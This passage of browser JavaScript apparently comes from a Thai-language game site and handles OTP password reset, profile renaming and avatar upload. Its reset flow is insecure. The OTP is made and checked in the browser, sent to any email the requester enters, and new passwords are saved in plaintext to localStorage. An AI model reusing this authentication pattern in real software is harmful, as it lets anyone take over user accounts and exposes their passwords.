    };

    function validateEmail(email) {
        return /\S+@\S+\.\S+/.test(email);
    }

    window.handleRequestOTP = function() {
        playClickSound();
        const forgotIdentifier = document.getElementById('forgot-identifier').value.trim();
        const targetEmail = document.getElementById('forgot-target-email').value.trim();

        if (!forgotIdentifier || !targetEmail) {
            return alert("❌ กรุณากรอกข้อมูลให้ครบถ้วน");
        }

        if (!validateEmail(targetEmail)) {
            return alert("❌ รูปแบบอีเมลไม่ถูกต้อง");
        }

        const matchedUser = users.find(user => 
            user.username.toLowerCase() === forgotIdentifier.toLowerCase() || 
            (user.email && user.email.toLowerCase() === forgotIdentifier.toLowerCase())
        );

        if (!matchedUser) {
            return alert("❌ ไม่พบบัญชีผู้เล่นนี้ในระบบ");
        }

        targetResetUser = matchedUser;
        generatedOTP = Math.floor(100000 + Math.random() * 900000).toString();

        const templateParams = {
            username: targetResetUser.username,
            otp_code: generatedOTP,
            target_email: targetEmail
        };

        document.getElementById('otp-status-text').innerHTML = `⏳ กำลังนำส่งรหัส OTP...`;

        emailjs.send('service_dhpxf9i', 'template_bp26tec', templateParams)
            .then(function(response) {
                document.getElementById('otp-status-text').innerHTML = `✉️ ระบบได้ส่งรหัส OTP ไปที่อีเมลเรียบร้อยแล้ว`;
                alert(`🎉 ส่งรหัส OTP สำเร็จ! โปรดนำรหัสจากอีเมลมากรอกยืนยันตัวตน`);
                document.getElementById('forgot-identifier').value = '';
                document.getElementById('forgot-target-email').value = '';
                switchAuthTab('otp');
            }, function(error) {
                document.getElementById('otp-status-text').innerHTML = `❌ เกิดข้อผิดพลาดในการส่งข้อความอีเมล`;
                alert("❌ ไม่สามารถส่งอีเมลได้สำเร็จ: " + JSON.stringify(error));
            });
    };

    window.handleVerifyOTPAndReset = function() {
        playClickSound();
        const otpInput = document.getElementById('otp-input').value.trim();
        const newPasswordInput = document.getElementById('otp-new-password').value.trim();

        if (!otpInput || !newPasswordInput) {
            return alert("❌ กรุณากรอกข้อมูลให้ครบถ้วน");
        }

        if (otpInput !== generatedOTP) {
            return alert("❌ รหัส OTP ไม่ถูกต้อง!");
        }

        const userIndex = users.findIndex(user => user.username.toLowerCase() === targetResetUser.username.toLowerCase());
        
        if (userIndex !== -1) {
            users[userIndex].password = newPasswordInput;
            localStorage.setItem('users', JSON.stringify(users));
            alert(`✅ รีเซ็ตรหัสผ่านเรียบร้อยแล้ว!`);
            generatedOTP = null;
            targetResetUser = null;
            document.getElementById('otp-input').value = '';
            document.getElementById('otp-new-password').value = '';
            switchAuthTab('login');
        }
    };

    window.handleProfileChange = function() {
        playClickSound();
        if (!currentUser) return;

        const editUsernameInput = document.getElementById('edit-username').value.trim();
        const avatarFile = document.getElementById('edit-avatar').files[0];

        if (!editUsernameInput) {
            return alert("❌ ชื่อผู้เล่นห้ามปล่อยว่างครับ");
        }

        const isNameTaken = users.some(user => 
            user.username.toLowerCase() === editUsernameInput.toLowerCase() && 
            user.username.toLowerCase() !== currentUser.username.toLowerCase()
        );
        if (isNameTaken) {
            return alert("❌ ชื่อผู้เล่นนี้มีคนอื่นใช้แล้ว");
        }

        function saveProfileData(avatarBase64Data) {
            const userIndex = users.findIndex(user => user.username.toLowerCase() === currentUser.username.toLowerCase());
            
            if (userIndex !== -1) {
                users[userIndex].username = editUsernameInput;
                if (avatarBase64Data) {
                    users[userIndex].avatar = avatarBase64Data;
                }
                
                currentUser = users[userIndex];
                localStorage.setItem('users', JSON.stringify(users));
                localStorage.setItem('currentUser', JSON.stringify(currentUser));
                
                alert("💾 บันทึกการเปลี่ยนแปลงเรียบร้อยแล้ว!");
                document.getElementById('edit-avatar').value = '';
                updateProfileUI();
            }
        }

        if (avatarFile) {
            const maxFileSize = 5 * 1024 * 1024;
            if (avatarFile.size > maxFileSize) {
                return alert("❌ ไฟล์รูปภาพมีขนาดใหญ่เกินไป!");
            }

            const reader = new FileReader();
            reader.onload = function(e) {
                const img = new Image();
                img.onload = function() {
                    if (img.width > 500 || img.height > 500) {
                        return alert(`❌ รูปภาพต้องมีขนาดไม่เกิน 500x500 พิกเซล`);
                    }
                    saveProfileData(e.target.result);
                };
                img.src = e.target.result;
            };
            reader.readAsDataURL(avatarFile);
        } else {
            saveProfileData(null);
        }
    };

    // เปิดหน้าเว็บปุ๊บ สั่งอัปเดต UI และดึงข้อมูลจากไฟล์ users.json เข้ามาผสานระบบทันที
    updateProfileUI();
    loadUsersFromJson();
});
